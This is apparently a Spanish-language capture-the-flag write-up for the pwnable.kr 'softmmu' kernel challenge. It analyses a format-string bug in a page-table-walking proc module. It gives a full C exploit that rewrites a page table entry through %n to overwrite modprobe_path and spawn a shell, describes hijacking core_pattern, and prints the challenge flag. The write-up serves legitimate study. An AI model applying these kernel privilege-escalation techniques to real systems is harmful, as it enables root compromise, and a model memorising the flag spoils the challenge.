# softmmu

![img](https://raw.githubusercontent.com/Calana2/Wargame_Writeups/refs/heads/main/pwnable.kr/Hackers_Secret/softmmu.png)

El módulo crea una [entrada proc](http://liujunming.top/2019/09/02/proc-entry-in-linux-kernel/) llamada /proc/softmmu y define sus callbacks para lectura y escritura:
``` C
int mmuinit(void)
{
  proc_dir_entry *local_proc_entry;
  int ret;
  printk("[+] Loading x86 PAE MMU emulator\n");
  printk("[+] Write the virtual address to /proc/softmm u\n");
  printk("[+] You can obtain it\'s physical address by re ading /proc/softmmu\n");
  printk("[+] i.e. echo -ne \'\\x00\\x80\\x04\\x08\' > /pro c/softmmu; hexdump -C /proc/softmmu\n");
  printk("[+] Let the kernel exploit begin :)\n");
  local_proc_entry = (proc_dir_entry *)create_proc_entry();
  procfile = local_proc_entry;
  if (local_proc_entry == (proc_dir_entry *)0x0) {
    printk(&failure);
    ret = -12;
  }
  else {
    local_proc_entry->read_proc = mmu_read;
    local_proc_entry->write_proc = mmu_write;
    ret = 0;
  }
  return ret;
}
```

*Nota: El decompilado de Ghidra oculta parámetros y algunas operaciones, por lo que es mejor mirar el desensamblado.*

`mmu_write` es simple, recibe 4 bytes del usuario, y la almacena en `req_vaddr` si no es una dirección virtual del kernel:
```C
int mmu_write(file *file,char *buf,ulong len,void *data )
{
  if (len != 4) {
    printk("write 4byte virtual address\n");
    return len;
  }
  _copy_from_user(0x1003b);
  if (req_vaddr < 0xc0000000) {
    printk("virtual address set to %x\n",req_vaddr);
    return 4;
  }
  req_vaddr = 0;
  printk("You don\'t have permission for kernel addres s\n");
  return 4;
}
```

`mmu_read` invoca a `mmu_walk` si `req_vaddr` no es nulo:
```C
int mmu_read(char *buf,char **loc,off_t off,int len,int *eof,void *data)

{
  int iVar1;
  ulong uVar2;
  
  iVar1 = 0;
  if (req_vaddr != 0) {
    uVar2 = mmu_walk(req_vaddr);
    *(ulong *)buf = uVar2;
    iVar1 = 4;
  }
  return iVar1;
}
```

`mmu_walk` es la función más compleja aquí:
```C

/* WARNING: Function: mcount replaced with injection : mcount */
/* WARNING: Unknown calling convention */

ulong mmu_walk(uint vaddr)

{
  uint uVar1;
  ulong ret;
  int in_FS_OFFSET;
  ulonglong PFN;
  int PageGlobalDirectory;
  
  PageGlobalDirectory = *(int *)(*(int *)(*(int *)(&curr ent_task + in_FS_OFFSET) + 0x1d4) + 0x24);
                    /* PDPT bits (31:30 of vaddr)  check the Pre sent Bit, if zero there is not
                       mapping for this 1GB region */
  uVar1 = *(uint *)(PageGlobalDirectory + (vaddr >> 3 0) * 8);
  if ((uVar1 & 1) == 0) {
    printk("PAE entry not present %x\n",uVar1,
           *(undefined4 *)(PageGlobalDirectory + 4 + (vad dr >> 30) * 8));
    ret = 0;
  }
  else {
                    /* Extracts PD bits (29:21 of vaddr) 
                       Converts the physical address to a virtual  address
                       Adds the offsets
                       Calculates to find the PDE
                        */
    uVar1 = *(uint *)(((vaddr & 0x3fe00000) >> 18) + 0x c0000000 + (uVar1 & 0xfffff000));
                    /* Checks the Present Bit, if zero there is n ot mapping for the Page Directory
                       Entry (512 entries), 2MB region. */
    if ((uVar1 & 1) == 0) {
      printk("PD64 entry not present %x\n",uVar1,(int)uV ar1 >> 0x1f);
      ret = 0;
    }
    else {
                    /* Checks the PS flag (bit 7) in the Page Dir ectory Entry, 
                       
                       PS -== 0 then a 4KB page table is located at the physical address specified
                       by bits 51:12 of the PDE. A page table has  512, 8 byte entries, PTEs
                       
                       PS == 1 then PDE maps a 2MB page Final physical address is computed: Bits
                       51:21 from PDE: Bits 20:0 from the orig inal linear address */
      if ((uVar1 & 0x80) == 0) {
        PFN = get_pte_entry(vaddr,(ulonglong *)((uVar1 &  0xfffff000) + 0xc0000000));
        if ((PFN & 1) == 0) {
          printk("PT64 entry not present %x\n",PFN);
          ret = 0;
        }
        else {
          ret = (uint)PFN & 0xfffff000 | vaddr & 0xfff;
        }
      }
      else {
        printk("2MB page\n");
        ret = uVar1 & 0xfff80000 | vaddr & 0x7ffff;
      }
    }
  }
  return ret;
}
```

Para obtener el PageGlobalDirectory se hace este "walk":
```
current_task (puntero a struct task_struct)
*(int*)(current_task) = &task_struct
*(int*)(*(int*)(current_task) + 0x1d4) = task_struct->mm (puntero a struct mm_struct)
*(int*)(*(int*)(*(int*)(current_task) + 0x1d4) + 0x24) = mm->pgd (puntero a array de pgd_t)
```

Como no tenía ni idea de como funcionaba la paginación y las traducciones de direcciones virtuales a físicas m/as allá de un mapeo lineal leí estos recursos:
- https://pages.cs.wisc.edu/~remzi/OSTEP/vm-paging.pdf
- https://pages.cs.wisc.edu/~remzi/OSTEP/vm-tlbs.pdf
- https://pages.cs.wisc.edu/~remzi/OSTEP/vm-smalltables.pdf
- https://flylib.com/books/en/4.454.1.60/1/

Además este sistema usa algo llamado "Physical Address Extension" (PAE), así que más recursos:
- https://wiki.osdev.org/Physical_Address_Extension
- https://wiki.osdev.org/Setting_Up_Paging_With_PAE
- https://medium.com/@geri.bod/pae-paging-memory-mapping-on-x86-8e8ba0879c5 (trae una pista)

Luego de todo ese intenso preparativo, encontramos una vulnerabilidad de cadena formateada en `get_pte_entry`:
```C
ulonglong get_pte_entry(uint vaddr,ulonglong *ppgd)
{
  uint uVar1;
  int in_FS_OFFSET;
  
  uVar1 = *(uint *)(ppgd + ((vaddr & 0x1ff000) >> 0xc)) ;
  if ((uVar1 & 1) != 0) {
    printk("[Debug] PGD(%x) Dump\n",ppgd);
    printk("[task:%s] %p:%02x %p:%02x %p:%02x %p:% 02x\n",
           *(int *)(&current_task + in_FS_OFFSET) + 0x2e4, ppgd,(int)*(char *)ppgd,(int)ppgd + 1,
           (int)*(char *)((int)ppgd + 1),(int)ppgd + 2,(int)*(c har *)((int)ppgd + 2),(int)ppgd + 3,
           (int)*(char *)((int)ppgd + 3));
    printk("[Debug] Dump Virtual Address\n");
    printk("\n===============================\n" );
    printk(req_vaddr);  // <---- 
    printk("\n===============================\n" );
  }
  return (ulonglong)(int)uVar1;
}
```

Según [este documento](https://www.kernel.org/doc/Documentation/printk-formats.txt) `printk` no soporta el operador de formato '%n' usado para escritura. Pero en esta versión sí: https://kunit.googlesource.com/linux/+/9196436ab2f713b823a2ba2024cb69f40b2f54a5

*Nota:Tampoco soporta los operadores para especificar posición relativa como %2$p, eso es algo de libc.*

Estuve un día viendo si podía ganar control sobreescribiendo EIP de alguna manera y luego, dado que el kernel no tiene KASLR ni SMAP/SMEP, redirigir la ejecución a mis funciones para hacer un 'ret2user' pero me fue imposible.

## Manipulación de Page Table Entries

Tras un par de días mas logré escritura/lectura arbitraria suplantando la dirección física de la PTE con la de un símbolo del kernel como modprobe_path.

Una parte de las direcciones virtuales del kernel llamado 'lowmem' hace mapeos directos, es decir, traducir su direccion física a virtual es restándole 'PAGE OFFSET', la dirección inicial de 'lowmem'.
```
[    0.000000] virtual kernel memory layout:
[    0.000000]     fixmap  : 0xfff15000 - 0xfffff000   ( 936 kB)
[    0.000000]     pkmap   : 0xffc00000 - 0xffe00000   (2048 kB)
[    0.000000]     vmalloc : 0xc47e0000 - 0xffbfe000   ( 948 MB)
[    0.000000]     lowmem  : 0xc0000000 - 0xc3fe0000   (  63 MB)
[    0.000000]       .init : 0xc18e1000 - 0xc19a4000   ( 780 kB)
[    0.000000]       .data : 0xc15f71a6 - 0xc18e0700   (2981 kB)
[    0.000000]       .text : 0xc1000000 - 0xc15f71a6   (6108 kB)
```

```C
//  gcc --no-pie -fno-pie -m32 exploit.c -o exploit
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define PAGE_OFFSET 0xC0000000

int main(int argc, char** argv) {
  unsigned long map_addr = 0x200000;
  unsigned long map_size = 0x1000;

  if (argc != 2) {
    printf("Usage: %s payload\n",argv[0]);
    return 1;
  }

  // map the payload address
  char *p = (char*)mmap((void*)map_addr, map_size, PROT_READ|PROT_WRITE|PROT_EXEC , MAP_ANONYMOUS | MAP_SHARED, 0, 0);
  if((unsigned long)p < 0) {
   perror("mmap");
  }

  // copy payload
  memcpy(p, argv[1], strlen(argv[1]));

  // open /proc/softmmu
  int fd = open("/proc/softmmu",O_RDWR);
  if (fd == -1) {
   perror("open");
  }

  // write to /proc/softmmu
  write(fd,"\x00\x00\x20",4);

  // read from /proc/softmmu
   unsigned char phy[4];
   read(fd,phy,4);
   printf("\n[+] Physical Address: [0x%x%x%x%x]\n",phy[3],phy[2],phy[1],phy[0]);
  unsigned long vaddr = (unsigned long)p;
 
  // modprobe_path
  unsigned long VA = 0xc187d3c0;
  unsigned long PA = VA - PAGE_OFFSET;
  unsigned long PFN = PA >> 12;
  unsigned long new_pte = (PFN << 12) | 0x167;
  printf("[+] New PTE: 0x%lx\n",new_pte);

  // ./exploit %103c%n%105c%n%183c%n // 0x187d067

  // Invalidate TLB
  mprotect(p, map_size, PROT_READ | PROT_WRITE);
  mprotect(p, map_size, PROT_READ | PROT_WRITE | PROT_EXEC);

  // Overwrite /sbin/modprobe
  printf("[+] Current value: %s\n",p+0x3c0);
  char *new_path =  "/tmp/pwned\x00";
  memcpy(p+0x3c0,new_path,strlen(new_path)+1);
  printf("[+] New value: %s\n",p+0x3c0);

  // a little test
  FILE* f = popen("cat /proc/sys/kernel/modprobe","r");
  unsigned char buf[30];
  fread(buf,30,1,f);
  printf("[+] /proc/sys/kernel/modprobe: %s\n",buf);

  // it works! but crashes after
  pid_t pid = fork();
  if (pid == 0) {
    execl("/bin/sh", "sh", NULL);
  } else {
    printf("[+] Launching shell, PID %d\n", pid);
    //while(1) pause();
  }
  return 0;
}
```

Dos aspectos a destacar: El primero es que al acceder al mapeo 'p' muchas veces el TLB la tendrá cacheada y no resolverá la nueva dirección física, entonces 'flusheamos' el TLB con `mprotect`. El segundo es que usar `MAP_ANONYMOUS` según la man-page de `mmap` genera una página copy-on-write, que por alguna razón causa un oops al intentar escribir así que usé `MAP_SHARED`.
```
/ $ cat /proc/sys/kernel/modprobe
/tmp/pwned
```

Aunque logré sobreescribir con éxito `modprobe_path` el hecho de que use `busybox` como un binario todo-en-uno, hace que no funcione, según [este artículo](https://pwning.tech/nftables/):
```
Somewhere along the line, the CONFIG_STATIC_USERMODEHELPER_PATH mitigation was introduced, which makes overwriting modprobe_path useless. The mitigation works by setting every executed binary's path to a busybox-like binary, which behaves differently based on the argv[0] filename passed. Hence, if we overwrite modprobe_path, only this argv[0] value would differ, which the busybox-like binary does not recognize and hence would not execute.
```

*Nota: Sí funciona, solo no lo intenté :|*

De hecho parece que todo lo que tenemos es `busybox`:
```
/ $ ls -lh /sbin/ /bin /usr/bin/ | grep -v busybox
/bin:
total 1843

/sbin/:
total 0

/usr/bin/:
total 0
```

## core_pattern

Al igual que `modprobe_path`, `core_pattern` es otra variable que podemos sobreescribir para obtener control. Normalmente contiene una cadena de formato que especifica la ruta y nombre de los coredumps generados pero el símbolo '|' al inicio de la cadenale dice al kernel que, en lugar de escribir un archivo, debe ejecutar un programa de espacio de usuario y enviarle los datos del volcado de memoria por la entrada estándar. Esto es genial y funciona en `busybox`!

Para compilar el programa usé musl-gcc, lo comprimí y luego lo copié en trozos en base64, rearmándolo en el emulador.

*Nota: Al parecer alguien lo resolvió usando `modprobe_path`, y además hay otras vías sobreescribiendo código ejecutable, le echaré un vistazo a eso.*

`k3rnel_priv1leg3_1s_bett3r_th4n_ro0t_privil3ge`
